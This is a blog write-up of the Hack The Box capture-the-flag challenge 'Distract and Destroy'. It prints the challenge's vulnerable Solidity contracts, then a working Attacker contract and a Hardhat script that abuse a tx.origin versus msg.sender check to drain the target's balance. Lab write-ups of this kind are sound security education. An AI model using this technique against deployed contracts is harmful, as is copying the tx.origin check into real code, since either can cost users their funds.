---
layout: post
title:  "[Challenge] HTB - Distract and Destroy"
date:   2023-08-1 00:21:16 -0300
categories: jekyll update
---

Today we gonna solve the challenge "Distract and Destroy" from hack the box website

before start if you wanna see how i solve the another challenges you see the blog [here](https://kypanz.github.io/)

Ok lets start reading the challenge

![image](https://github.com/kypanz/kypanz.github.io/assets/37570367/93f0b199-f122-4d58-8d3c-44dc234b569a)

download the files ...

![image](https://github.com/kypanz/kypanz.github.io/assets/37570367/eb15e580-de22-422f-adf6-a63601acf61b)

Here are the two files

### Creature.sol
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Creature {
    uint256 public lifePoints;
    address public aggro;

    constructor() payable {
        lifePoints = 1000;
    }

    function attack(uint256 _damage) external {
        if (aggro == address(0)) {
            aggro = msg.sender;
        }

        if (_isOffBalance() && aggro != msg.sender) {
            lifePoints -= _damage;
        } else {
            lifePoints -= 0;
        }
    }

    function loot() external {
        require(lifePoints == 0, "Creature is still alive!");
        payable(msg.sender).transfer(address(this).balance);
    }

    function _isOffBalance() private view returns (bool) {
        return tx.origin != msg.sender;
    }
}

```


### Setup.sol
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Creature} from "./Creature.sol";

contract Setup {
    Creature public immutable TARGET;

    constructor() payable {
        require(msg.value == 1 ether);
        TARGET = new Creature{value: 10}();
    }

    function isSolved() public view returns (bool) {
        return address(TARGET).balance == 0;
    }
}

```

To solve this challenge wee need to get the aggro of the monster 

![image](https://github.com/kypanz/kypanz.github.io/assets/37570367/ed5705f9-2f94-4545-ab8d-5144d535d132)


So to do that you need to understand the difference of using `tx.origin` and `msg.sender`

in a short summary `txt.origin` is the wallet that iniciate all the transaction flow, and `msg.sender` is the actual caller of the function

so here we need to create a smart contract to interact with the `Creature.sol`, in this case the smart contract name is gonna be `Attacker.sol`

here is the new smart contract

### Attacker.sol

```solidity
// SPDX-License-Identifier: GPL-3.0
/*
    This smart contract is gonna be used to bypass the conditional, from the creature.sol
*/
pragma solidity >=0.7.0 <0.9.0;

import "./Creature.sol";

contract Attacker {
    Creature creature;
    uint256 private nuevo_valor = 0;

    constructor(Creature _creature) {
        creature = _creature;
    }

    function attackCreature(uint256 _damage) public {
        creature.attack(_damage);
    }

}

```

let me draw a diagram flow to understand better how this gonna work

![Challenge  HTB - Distract and Destroy drawio](https://github.com/kypanz/kypanz.github.io/assets/37570367/24e205f5-2454-4211-a42a-53ba83914b56)


with this smart contract and flow we gonna exploit the vulnerability of `Creature.sol` in this pice of code

```solidity
function _isOffBalance() private view returns (bool) {
        return tx.origin != msg.sender;
}
```

so the first call is gonna be directly from the `Wallet Account` and the second to attack the creature is gonna come from `Attacker.sol`, you can check the diagram flow again to understand better

So i gonna use hardhat to do this and here is my script 

### Hardhat Tests Cases
```javascript
/*
    This script connect to the target and run the 
    functions needed to get the htb flag
*/

const { expect } = require('chai');
require('dotenv').config();

// .Env data to interact with the smart contracts
const {
    PRIV_KEY,
    ADDRESS,
    TARGET_ADDRESS,
    SETUP_ADDRESS
} = process.env;

// Smart contract names
const SETUP = 'Setup';
const TARGET = 'Creature';
const ATTACKER = 'Attacker';

describe("HTB flag flow :)", function () {

    let contractSetup;
    let contractTarget;
    let contractAttacker;

    it('[ Instantiate ] Setup.sol', async () => {

        const Contract = await hre.ethers.getContractFactory(SETUP);
        contractSetup = await Contract.attach(SETUP_ADDRESS);
        expect(contractSetup.target).to.be.equal(SETUP_ADDRESS);

    });

    it('[ Instantiate ] Creature.sol', async () => {

        const Contract = await hre.ethers.getContractFactory(TARGET);
        contractTarget = await Contract.attach(TARGET_ADDRESS);
        expect(contractTarget.target).to.be.equal(TARGET_ADDRESS);

    });
    
    it('[ Deploy and Instantiate ] Attacker.sol', async () => {

        const Contract = await hre.ethers.getContractFactory(ATTACKER);
        contractAttacker =  await Contract.deploy(TARGET_ADDRESS);
        expect(contractTarget.runner.address).to.be.equal(ADDRESS);

    });


    it('[ Target ] Calling the smart contract to get the aggro of the creature', async () => {

        const response = await contractTarget.attack(100);
        expect(response.from).to.be.equal(ADDRESS);

    });

    it('[ Attacker ] Calling the smart contract function to do the damage', async () => {

        const response = await contractAttacker.attackCreature(1000);
        expect(response.from).to.be.equal(ADDRESS);

    });


    it('[ Target ] Claim the loot', async () => {

        const response = await contractTarget.loot();
        expect(response.from).to.be.equal(ADDRESS);

    });

    it('[ Setup ] Checking if is solved = true', async () => {

        const response = await contractSetup.isSolved();
        expect(response).to.be.equal(true);

    });
    

});

```

you can run the test case using : 

```shell
npx hardhat test --network htb
```

and you gonna see the next one in the console 

![image](https://github.com/kypanz/kypanz.github.io/assets/37570367/4202235d-6661-4ce5-91d4-dd0e5add5f56)

so now we can go to the `http://${ip}:${port}/flag` and claim the Flag :)

![image](https://github.com/kypanz/kypanz.github.io/assets/37570367/6f648110-7271-48e5-b6bd-7fe5fb0b61e2)

and then just send the Flag :)

![image](https://github.com/kypanz/kypanz.github.io/assets/37570367/3f4d8009-fecd-4b86-bfef-0d83027eb2f7)

![image](https://github.com/kypanz/kypanz.github.io/assets/37570367/72353feb-51c5-4c74-a0b1-2c5e7dfa502b)


<img src="https://media.tenor.com/77hxEuhRcFcAAAAd/gecko-lizard.gif" width="300" height="300" >
